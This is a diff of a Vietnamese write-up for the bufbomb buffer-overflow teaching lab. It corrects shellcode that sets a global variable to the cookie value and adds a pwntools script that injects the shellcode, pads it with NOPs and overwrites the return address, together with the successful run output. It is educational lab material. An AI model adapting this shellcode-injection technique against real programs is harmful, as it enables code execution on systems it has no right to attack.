@@ -32,16 +32,20 @@ Và cả địa chỉ của biến `cookie`.
 
 Vậy shellcode của chúng ta như sau:  
 ```asm
-movl 0x8013F158, %eax
-movl (%eax), %eax
-movl %eax, (0x8013F160)
-call 0x80139B69
+movl $0x8013F160,%eax
+movl $0x8013F158,%ebx
+movl (%ebx),%ebx
+movl %ebx,(%eax)
+push $0x80139b69
+push $0x80139b69
+ret
 ```  
 
-Ở shellcode trên, chúng ta gán địa chỉ của biến `cookie` vào thanh ghi `%eax`. Sau đó, chúng ta đọc giá trị `cookie` và gán giá trị đó vào `%eax`. Kế đến, chúng ta gán giá trị `cookie` này vào `global_value`, và cuối cùng là gọi hàm `bang`.  
-> `0x80139B69` chính là địa chỉ của hàm `bang`.  
+> `0x8013F160` là địa chỉ của biến `global_value`.
+> `0x8013F158` là địa chỉ của biến `cookie`.
+> `0x80139B69` là địa chỉ của hàm `bang`.  
 
-Byte representation của shellcode:  
+Byte biểu diễn của shellcode:  
 ```
 └─$ objdump -d shellcode.o
 
@@ -51,10 +55,13 @@ shellcode.o:     file format elf32-i386
 Disassembly of section .text:
 
 00000000 <.text>:
-   0:   a1 58 f1 13 80          mov    0x8013f158,%eax
-   5:   8b 00                   mov    (%eax),%eax
-   7:   a3 60 f1 13 80          mov    %eax,0x8013f160
-   c:   e8 65 9b 13 80          call   0x80139b76
+   0:   b8 60 f1 13 80          mov    $0x8013f160,%eax
+   5:   bb 58 f1 13 80          mov    $0x8013f158,%ebx
+   a:   8b 1b                   mov    (%ebx),%ebx
+   c:   89 18                   mov    %ebx,(%eax)
+   e:   68 69 9b 13 80          push   $0x80139b69
+  13:   68 69 9b 13 80          push   $0x80139b69
+  18:   c3                      ret
 ```
 
 Tiếp theo, chúng ta sẽ tìm địa chỉ để ghi đè vào `return address`.  
@@ -68,4 +75,46 @@ Vậy `exploit_payload` của chúng ta sẽ có độ dài là `0x28 + 0x4 + 0x
 
 ### Script
 ```python
+#! /bin/python3
 
+from pwn import *
+
+context.binary = './bufbomb'
+
+# tạo 1 process cho chương trình bufbomb
+io = process(['./bufbomb', '-u', '09821978'])
+
+# tạo shellcode
+shellcode = b'\xb8\x60\xf1\x13\x80\xbb\x58\xf1\x13\x80\x8b\x1b\x89\x18\x68\x69\x9b\x13\x80\x68\x69\x9b\x13\x80\xc3'
+# tạo exploit_payload
+# \x90 là byte biểu diễn cho lệnh nop (no operation)
+exploit_payload = shellcode + b'\x90' * (0x28 + 0x4 - len(shellcode))
+# chèn địa chỉ của shellcode vào payload để ghi đè return address
+exploit_payload += p32(0x55683cf8)
+
+print(f"{exploit_payload = }")
+
+io.sendline(exploit_payload)
+io.interactive()
+```  
+
+Chạy script.  
+```
+└─$ python3 level2.py
+[*] '/mnt/f/src-team-1/bufbomb'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './bufbomb': pid 365
+exploit_payload = b'\xb8`\xf1\x13\x80\xbbX\xf1\x13\x80\x8b\x1b\x89\x18hi\x9b\x13\x80hi\x9b\x13\x80\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf8<hU'
+[*] Switching to interactive mode
+[*] Process './bufbomb' stopped with exit code 0 (pid 365)
+Userid: 09821978
+Cookie: 0x31f21393
+Type string:Bang!: You set global_value to 0x31f21393
+VALID
+NICE JOB!
+```  
+> Thành công!
